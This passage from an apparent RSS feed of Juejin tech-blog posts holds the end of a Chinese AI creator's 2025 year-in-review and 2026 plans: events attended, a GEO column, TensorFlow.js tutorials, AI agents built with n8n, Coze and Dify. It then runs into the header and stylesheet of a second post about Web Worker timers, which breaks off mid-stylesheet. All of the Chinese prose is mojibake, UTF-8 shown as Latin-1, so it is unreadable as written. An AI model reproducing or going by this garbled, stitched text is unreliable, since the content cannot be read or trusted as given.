<p>è¿™ä¸æ˜¯æˆ‘å˜å¾—æ›´ä¼šè¯´ï¼Œè€Œæ˜¯æˆ‘é€æ¸ç¡®è®¤äº†ä¸€ä»¶äº‹ï¼š</p>
<blockquote>
<p><strong>åˆ†äº«çš„ä»·å€¼ï¼Œä¸åœ¨äºè¯æ˜æˆ‘æ‡‚å¤šå°‘ï¼Œè€Œåœ¨äºå®ƒä¼šé€¼æˆ‘æŠŠç»éªŒæ²‰æ·€æˆåˆ«äººä¹Ÿèƒ½ç”¨çš„ä¸œè¥¿ã€‚</strong></p>
</blockquote>
<p><strong>æ·±åœ³äººå·¥æ™ºèƒ½ä¸æœºå™¨äººå‘å±•è®ºå›ï¼š</strong> è®©æˆ‘çœ‹åˆ°äº† <code>AI</code> è½åœ°å·¥ä¸šç•Œçš„å®å¤§å™äº‹ã€‚</p>
<p>ç°åœºç…§ç‰‡ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4d1bde38f8542bd8be20ab38db4c432~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=cXmH7D5RLRTjUd3adikSmAmA4zM%3D" alt="20260112-223141" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e08db5fb0654fcab87bef15f9b25911~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=RxukP2R9EJ%2FkOa1b2Ubp5s%2Fd3Nc%3D" alt="ops-coffee-1768370306789.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b626a75d214c4e3ea160ae71c95b4977~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=GzsgatJiYo18cHp8pv0sboIbTH0%3D" alt="ops-coffee-1768370342547.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8671196d20804c9aad4de582f1d1ac13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=VvSHvCWUHP3yfuX847dyRuKaADM%3D" alt="20260112-223352" loading="lazy"/></p>
<p><strong>è±†åŒ…ç³»åˆ—æ´»åŠ¨ï¼ˆ<code>Workshop</code>/æŒ‘æˆ˜èµ›ï¼‰ï¼š</strong> ä» <strong><code>TOP</code> åˆ›ä½œè€…é¢å¯¹é¢ç›´æ’­åˆ†äº«</strong>ï¼Œåˆ° <strong>åˆ›ä½œæ´¾å¯¹ç°åœºæ¼”è®²</strong>ï¼Œæˆ‘æœ€å¼ºçš„ä½“æ„Ÿæ˜¯ï¼š<strong>åˆ†äº«æŠ€æœ¯å¸¦æ¥çš„å¿«ä¹ï¼Œè¿œå¤§äºç‹¬è‡ªè·‘é€šä»£ç ã€‚</strong></p>
<p><code>Workshop</code> ç°åœºç…§ç‰‡ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bf3a0ee6568418ca009605f0cf084f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=SuodQh3awV9Jc2WENhMnefqTsY0%3D" alt="20260113-184823" loading="lazy"/></p>
<p>æŒ‘æˆ˜èµ›ç°åœºç…§ç‰‡ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/883a7fe6f65345ebaa83d674cdcefbfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=u7q%2BtoasYd7Ty1duzL940gBfTZU%3D" alt="20260114-135400.jpg" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02a88a4bc99744b2b57934f9b67ba934~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=wQHwcgtVw4JgF1IFzVfkyPGEiD0%3D" alt="20260114-135411.jpg" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a92bfc9eb9d46f9b0f337d972bbe840~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=E5u83rpu2QaTBo%2Bnqud2GEc131g%3D" alt="20260113-184750.jpg" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e19e0eb616004199aacd4e53e869c134~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=IrFhPs1SOhgHTyibuFnMWYXbxzI%3D" alt="20260114-135406.jpg" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4b706fcb03e498dba00ea5532ec47e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=Sg1OcFyKOBTT0eVeg8jP1zaav1U%3D" alt="20260114-135416" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4e7d3d3119e4ab68e0829f1067395ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=7axLhfYl4R3cI3G7mO8WU35WbCg%3D" alt="20260114-135557.jpg" loading="lazy"/></p>
<p><strong><code>PromptPilot</code> äº§å“å‘å¸ƒä¼šï¼š</strong> è®©æˆ‘æ€è€ƒå¦‚ä½•å°† <code>AI</code> èƒ½åŠ›äº§å“åŒ–ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ 2026 å¹´çš„æ–¹å‘ã€‚è¿™åœºå‘å¸ƒä¼šè®©æˆ‘æ›´æ¸…æ¥šåœ°æ„è¯†åˆ°ï¼š<code>AI</code> èƒ½åŠ›äººäººå¯ç”¨ï¼Œä½†æŠŠèƒ½åŠ›åšæˆäº§å“æ‰æ˜¯æ›´éš¾çš„éƒ¨åˆ†ã€‚</p>
<p>ä»åšä¸€ä¸ªèƒ½è·‘çš„ <code>demo</code>ï¼Œåˆ°åšä¸€ä¸ªåˆ«äººæ„¿æ„æŒç»­ä½¿ç”¨ã€èƒ½å½¢æˆé•¿æœŸä»·å€¼çš„äº§å“ï¼Œä¸­é—´å·®çš„ä¸æ˜¯å‡ ä¸ªåŠŸèƒ½ï¼Œè€Œæ˜¯ä¸€æ•´å¥—ç³»ç»Ÿï¼šä½“éªŒã€ç¨³å®šæ€§ã€æ•°æ®é—­ç¯ã€å¯ç»´æŠ¤æ€§ã€‚</p>
<p>è¿™ä¹Ÿé€æ¸å˜æˆæˆ‘ 2026 å¹´æ›´æƒ³æŠ•å…¥çš„æ–¹å‘ä¹‹ä¸€ï¼š<strong>æŠŠå·¥ä½œæµåšæˆå¯ä»¥å¤ç”¨ã€å¯æŒç»­è¿­ä»£çš„äº§å“å½¢æ€ã€‚</strong></p>
<p>ç°åœºç…§ç‰‡ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46cc58bf896e450699568492e0cc3950~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=6CkErXBG9%2F4SSEuoNJBG090wp98%3D" alt="image-20250920190046128.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d608576d3c542cdbd6bf1e3765ea0ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=LCKr5xY22B8Hbq8PCioJE8ms6SQ%3D" alt="20260113-184820.jpg" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7aa64c3ed1a44343b9f1498fe881b020~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=xEeUcfkcchgQc6iF5pfASP7RRRA%3D" alt="20260113-184539.jpg" loading="lazy"/></p>
<p>å€Ÿç€å»åŒ—äº¬å‚åŠ å‘å¸ƒä¼šçš„æœºä¼šï¼Œæˆ‘ä¹ŸçŸ­æš‚åœ°é€ƒç¦»äº†ä»£ç ï¼Œå»æ„Ÿå—äº†è¿™åº§åŸå¸‚çš„çƒŸç«æ°”æ¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c8306da9b15e4b4e9d31b9a33c09d1c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=p%2Fz1PJdF8RsV30YER7c0dHV6u9I%3D" alt="20260113-184548.jpg" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48c4459455a447c39bb60759fbcf39dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=Ho2o8DDfRr3HHS90JxKXziKqAHk%3D" alt="20260113-184554.jpg" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d51fe9c219d409681a696923579386c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=GlfEapDUio8SRkXG6W4OpaRx0PU%3D" alt="20260113-184551.jpg" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07eedceb6f7b4eb99a8387e6feb7006f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=xMQ0DjPfKa8AbhHjblU0q422OWo%3D" alt="20260113-184614.jpg" loading="lazy"/></p>
<p><strong>å…³äºå¹¿å‘Š</strong>ï¼šå•†ä¸šä»·å€¼æ˜¯ä»·å€¼åˆ›é€ çš„å‰¯äº§ç‰©ã€‚</p>
<p>ä»Šå¹´æˆ‘ä¹Ÿå°è¯•æ€§åœ°æ¥äº†å‡ ä¸ªå¹¿å‘Šã€‚è¯´å®è¯ï¼Œæˆ‘æŠŠå®ƒçœ‹ä½œåˆ›ä½œè€…è·¯å¾„é—­ç¯çš„ä¸€éƒ¨åˆ†ï¼šå½“ä½ çš„è¾“å‡ºæŒç»­ä¸ºä»–äººåˆ›é€ ä»·å€¼ï¼Œå•†ä¸šä»·å€¼å¾€å¾€æ˜¯é¡ºå¸¦å‡ºç°çš„ç»“æœã€‚</p>
<p>å½“ç„¶ï¼Œè¿™ä¹Ÿä¼šåè¿‡æ¥æé†’æˆ‘ï¼š<strong>å†…å®¹çš„é•¿æœŸä¿¡ä»»æ¯”çŸ­æœŸæ”¶ç›Šæ›´é‡è¦</strong>ã€‚æ‰€ä»¥æˆ‘ä¼šæ›´è°¨æ…åœ°é€‰æ‹©åˆä½œï¼Œä¹Ÿæ›´å¸Œæœ›å®ƒä¸å½±å“å¤§å®¶çš„æ­£å¸¸é˜…è¯»ä½“éªŒã€‚</p>
<hr/>
<h3 data-id="heading-10">2026ï¼šåœ¨ä¸ç¡®å®šä¸­æ„å»ºç¡®å®šæ€§</h3>
<p>é¢å¯¹å³å°†åˆ°æ¥çš„ 2026ï¼Œæˆ‘ä¸æƒ³å†ä»€ä¹ˆéƒ½å†™ä¸€ç‚¹ï¼Œè€Œæ˜¯è¦å…ˆå…‘ç° 2025 å¹´çš„ç¡¬æ ¸æ‰¿è¯ºï¼Œå†ç¨³æ‰ç¨³æ‰“åœ°å‘ <code>AI</code> æ·±æ°´åŒºè¿›å‘ã€‚æˆ‘çš„è®¡åˆ’åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š<strong>è¡¥é½åŸºçŸ³</strong>ä¸<strong>å…¨é¢æ‹“è’</strong>ã€‚</p>
<h4 data-id="heading-11">å¡«å‘ä¸è¡¥é½ï¼šå…‘ç° 2025 çš„ç¡¬æ ¸æ‰¿è¯º</h4>
<p>2025 å¹´æˆ‘å¼€äº†ä¸‰ä¸ªæå…·æŠ¤åŸæ²³çš„é•¿æœŸæ–¹å‘ï¼Œä½†å› ä¸ºæ´»åŠ¨ã€å·¥å…·è¿­ä»£å’Œæ–°çµæ„Ÿå¤ªå¤šï¼Œæ›´æ–°èŠ‚å¥æ–­äº†ã€‚è¿™äº›å‘ä¸è¡¥ï¼Œåé¢å†å¼€æ–°å‘åªä¼šæ›´ä¹±ã€‚æ‰€ä»¥ 2026 å¹´ä¼˜å…ˆçº§æœ€é«˜çš„å°±æ˜¯æŠŠå®ƒä»¬è¡¥æˆå®Œæ•´ã€å¯å¤ç”¨çš„ç³»åˆ—ã€‚</p>
<ul>
<li><strong>ã€Š<code>GEO</code> ç”Ÿæˆå¼å¼•æ“ä¼˜åŒ–ä»å…¥é—¨åˆ°ç²¾é€šã€‹ä¸“æ </strong>ï¼š<code>GEO</code> æ˜¯ <code>AI</code> æ—¶ä»£çš„æ–° <code>SEO</code>ã€‚æˆ‘ä¼šç³»ç»Ÿè®²é€å¦‚ä½•è®©å†…å®¹è¢« <code>ChatGPT</code>ã€<code>Perplexity</code>ã€è±†åŒ…ã€<code>DeepSeek</code> ç­‰å¼•æ“ä¼˜å…ˆå¼•ç”¨ã€‚ä» <code>RAG</code> ä¼˜åŒ–ã€è¯­ä¹‰ç†è§£åˆ° <code>E-E-A-T</code> æƒé‡æå‡ï¼Œç›®æ ‡æ˜¯è®©åˆ›ä½œè€…ä»<strong>è¢«ç®—æ³•å–‚</strong>è¿›åŒ–ä¸º<strong>æ‡‚ç®—æ³•å–‚äºº</strong>ã€‚</li>
<li><strong>ã€Šçº¯å‰ç«¯ç”¨ <code>TensorFlow.js</code> å®ç°æ™ºèƒ½å›¾åƒåº”ç”¨ã€‹ç³»åˆ—</strong>ï¼šåšæŒåœ¨æµè§ˆå™¨é‡Œè·‘ <code>AI</code>ï¼Œè¿™æ˜¯å‰ç«¯äººçš„å°Šä¸¥ã€‚æˆ‘å°†è¡¥é½ä»ç¯å¢ƒæ­å»ºã€æ¨¡å‹åŠ è½½åˆ° <code>WebGL</code> åŠ é€Ÿä¼˜åŒ–çš„å…¨é“¾è·¯æ•™ç¨‹ï¼Œå¹¶é…å¥—å¯å¤ç”¨çš„ <code>Demo</code> ä»“åº“ï¼Œå¸¦å¤§å®¶åœ¨ç½‘é¡µé‡Œç©è½¬å®æ—¶æ»¤é•œä¸ç‰©ä½“æ£€æµ‹ã€‚</li>
<li><strong>ã€Š<code>GitHub</code> çƒ­é—¨é¡¹ç›®ä¸æŠ€æœ¯è¶‹åŠ¿å‰æ²¿ã€‹æœˆæ›´è®¡åˆ’</strong>ï¼šç»§ç»­æ‹…ä»»å¤§å®¶çš„æŠ€æœ¯å“¨å…µã€‚æ¯æœˆç²¾é€‰ 10 ä¸ªçœŸæ­£èƒ½è½åœ°çš„çƒ­é—¨é¡¹ç›®ï¼Œæ‹†è§£äº®ç‚¹ã€åˆ†äº«é¿å‘æŒ‡å—ï¼Œå¸®å¤§å®¶åœ¨ä¿¡æ¯çˆ†ç‚¸ä¸­ç­›é€‰å‡ºçœŸæ­£çš„ç”Ÿäº§åŠ›å·¥å…·ã€‚</li>
</ul>
<h4 data-id="heading-12">æ‹“è’ä¸è¿›åŒ–ï¼šå…¨é¢æ‹¥æŠ± <code>AI 2.0</code> ç”Ÿæ€</h4>
<p>åœ¨æ‰“å¥½åœ°åŸºåï¼Œæˆ‘ä¼šå°†ç²¾åŠ›æŠ•å‘æ›´å…·è‡ªä¸»æ€§ä¸äº§å“åŒ–çš„ <code>AI</code> ä¸»é¢˜ï¼š</p>
<ul>
<li><strong><code>AI Agent</code>ï¼ˆæ™ºèƒ½ä½“ï¼‰å®æˆ˜ï¼š</strong> æ¢ç´¢ä»ç®€å• <code>Prompt</code> åˆ°å¤š <code>Agent</code> åä½œç³»ç»Ÿçš„æ¼”è¿›ï¼Œç ”ç©¶å¦‚ä½•åˆ©ç”¨ <code>n8n</code>ã€<code>Coze</code>ã€<code>Dify</code> æ„å»ºçœŸæ­£èƒ½è·‘é€šä¸šåŠ¡çš„æ•°å­—å‘˜å·¥ã€‚</li>
<li><strong>å¤§æ¨¡å‹åº•å±‚ä¸å¤šæ¨¡æ€åº”ç”¨ï¼š</strong> æŒç»­è¾“å‡ºå…³äºæ¨¡å‹æ¨ç†ã€å·¥å…·è°ƒç”¨ã€<code>RAG</code> æ¶æ„åŠå¤§æ¨¡å‹å¾®è°ƒçš„æµ‹è¯„ä¸ç§‘æ™®æ–‡ç« ã€‚</li>
<li><strong>ä½œå“åŒ–è¾“å‡ºï¼š</strong> ä¸å†æ»¡è¶³äºå†™ <code>Demo</code>ï¼Œå°è¯•åšæ›´å®Œæ•´ã€èƒ½è§£å†³å…·ä½“ç—›ç‚¹çš„ <code>AI</code> åŸå‹æˆ–å°å·¥å…·ã€‚</li>
</ul>
<h4 data-id="heading-13">èŠ‚å¥æœºåˆ¶ï¼šå…ˆäº¤ä»˜ï¼Œå†æ‰©å¼ </h4>
<p>ä¸ºäº†é¿å…å†æ¬¡â€œæ–­æ›´â€ï¼Œæˆ‘ä¸ºè‡ªå·±è®¾å®šäº†ä¸€å¥—å¯æŒç»­çš„èŠ‚å¥ï¼š</p>
<ul>
<li><strong>ä¿åº•ï¼š</strong> æ¯æœˆç¨³å®šäº¤ä»˜ 1-2 ç¯‡é«˜è´¨é‡ï¼ˆè¡¥æ¬ ä¼˜å…ˆï¼Œä¸‰æ¡æ¬ æ›´ä¸æ–­æ›´ï¼‰</li>
<li><strong>å†²åˆºï¼š</strong> çŠ¶æ€å¥½æ—¶åŠ æ›´ <code>AI Agent</code> æˆ–å¤§æ¨¡å‹ç›¸å…³çš„å®æˆ˜æ•™ç¨‹ä¸äº’åŠ¨æ¡ˆä¾‹</li>
<li><strong>å¤ç›˜ï¼š</strong> æ¯å­£åº¦æ·˜æ±°ä½ä»·å€¼æ–¹å‘ï¼Œ<code>All-in</code> é«˜å¤åˆ©èµ›é“</li>
</ul>
<hr/>
<h3 data-id="heading-14">ç»“è¯­</h3>
<p>2025 å¹´æˆ‘æœ€å¤§çš„æ”¶è·ï¼Œä¸æ˜¯ç”¨äº†å¤šå°‘å·¥å…·ï¼Œä¹Ÿä¸æ˜¯å†™äº†å¤šå°‘ç¯‡æ–‡ç« ï¼Œè€Œæ˜¯æˆ‘é€æ¸å»ºç«‹èµ·ä¸€ç§<strong>æ›´å¯æŒç»­çš„ç”Ÿå‘½çŠ¶æ€</strong>ï¼š</p>
<ul>
<li><strong>æ‰§è¡Œå±‚ï¼š</strong> ç”¨ <code>AI</code> æ¶ˆé™¤é‡å¤åŠ³åŠ¨ï¼Œè®©æ‰§è¡Œå˜å¾—æåº¦å»‰ä»·</li>
<li><strong>èµ„äº§å±‚ï¼š</strong> æŠŠçœä¸‹çš„æ—¶é—´æŠ•å…¥é•¿æœŸèµ„äº§ï¼ˆå¦‚ <code>GEO</code>ã€<code>TensorFlow.js</code>ï¼‰ï¼Œè®©çµæ„Ÿé€šå‘é—­ç¯</li>
<li><strong>æˆé•¿å±‚ï¼š</strong> é€šè¿‡æ´»åŠ¨ä¸æ¼”è®²ï¼Œå°†ç‹¬è‡ªå­¦ä¹ è½¬åŒ–ä¸ºå¸¦åé¦ˆçš„ç¤¾äº¤è¿›åŒ–</li>
</ul>
<p>ç”Ÿæ´»å’Œå·¥ä½œä¸åº”è¯¥æ˜¯å‰²è£‚çš„ï¼Œ<code>AI</code> ç»™äº†æˆ‘ä»¬ä¸€ä¸ªæŠŠå®ƒä»¬é‡æ–°ç¼åˆçš„æœºä¼šã€‚å¦‚æœä½ ä¹Ÿæ„Ÿå—åˆ°äº† <code>AI</code> å¸¦æ¥çš„å†²å‡»ï¼Œæˆ‘å»ºè®®ä½ å°è¯•è½¬æ¢è§†è§’ï¼š<strong>ä¸è¦æŠŠ <code>AI</code> å½“æˆæ›´å¼ºçš„æœç´¢å¼•æ“ï¼Œè€Œè¦æŠŠå®ƒå½“æˆä½ ä¸ªäººç³»ç»Ÿçš„æ‰§è¡Œå±‚ã€‚</strong></p>
<p>ä½ è´Ÿè´£åˆ¤æ–­ã€è¡¨è¾¾ä¸å†³ç­–ï¼›å·¥å…·è´Ÿè´£æ‰§è¡Œã€æ ¡éªŒä¸å¤ç”¨ã€‚é•¿æœŸæ¥çœ‹ï¼Œè¿™ä¼šè®©ä½ æ´»å¾—è¶Šæ¥è¶Šä»å®¹ã€‚</p>
<p>æ„Ÿè°¢æ˜é‡‘è¿™ä¸ªå¹³å°ï¼Œè®©æˆ‘æ‰¾åˆ°äº†å±äºè‡ªå·±çš„èŠ‚å¥ã€‚2026 å¹´ï¼Œæˆ‘ä¾ç„¶ä¼šåœ¨è¿™é‡Œï¼Œåšä¸€ä¸ª<strong>å¾ˆèƒ½æŠ˜è…¾å´ä¸å·</strong>çš„ <code>AI</code> åˆ›ä½œè€…ã€‚</p>
<p><strong>æœ€åï¼Œé€ç»™å¤§å®¶ä¸€å¥è¯ï¼šä¸è¦å®³æ€•å·¥å…·è¿­ä»£å¤ªå¿«ï¼Œè¦å®³æ€•ä½ å¤±å»äº†çœ‹åˆ°ä¿¡å·å°±ç«‹åˆ»è¡ŒåŠ¨çš„å‹‡æ°”ã€‚</strong></p>
<hr/>
<p>å¦‚æœä½ å¯¹æˆ‘çš„ <strong><code>AI</code> å·¥å…·æµï¼ˆå¦‚ <code>n8n</code> ä¸ <code>Coze</code> çš„è”åŠ¨ï¼‰</strong> æˆ–æ˜¯ <strong><code>AI</code> è¾…åŠ©å†™ä½œæµç¨‹</strong> æ„Ÿå…´è¶£ï¼Œæˆ–è€…æƒ³èŠèŠ <strong><code>AI Agent</code></strong> çš„æœªæ¥ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€ã€‚æˆ‘ä»¬ 2026 è§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‹’ç» `setInterval`ï¼æ‰‹æ’•â€œæ­»äº†ä¹ˆâ€ç”Ÿå‘½å€’è®¡æ—¶ï¼Œå¸¦ä½ çœ‹çœ‹ 60FPS ä¸‹çš„ Web Worker ä¼˜é›…å¤šçº¿ç¨‹]]></title>    <link>https://juejin.cn/post/7594851429163270178</link>    <guid>https://juejin.cn/post/7594851429163270178</guid>    <pubDate>2026-01-14T17:50:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594851429163270178" data-draft-id="7594851429163253794" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‹’ç» `setInterval`ï¼æ‰‹æ’•â€œæ­»äº†ä¹ˆâ€ç”Ÿå‘½å€’è®¡æ—¶ï¼Œå¸¦ä½ çœ‹çœ‹ 60FPS ä¸‹çš„ Web Worker ä¼˜é›…å¤šçº¿ç¨‹"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-14T17:50:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="zzpper"/> <meta itemprop="url" content="https://juejin.cn/user/3560673121928058"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‹’ç» `setInterval`ï¼æ‰‹æ’•â€œæ­»äº†ä¹ˆâ€ç”Ÿå‘½å€’è®¡æ—¶ï¼Œå¸¦ä½ çœ‹çœ‹ 60FPS ä¸‹çš„ Web Worker ä¼˜é›…å¤šçº¿ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3560673121928058/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    zzpper
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T17:50:22.000Z" title="Wed Jan 14 2026 17:50:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body 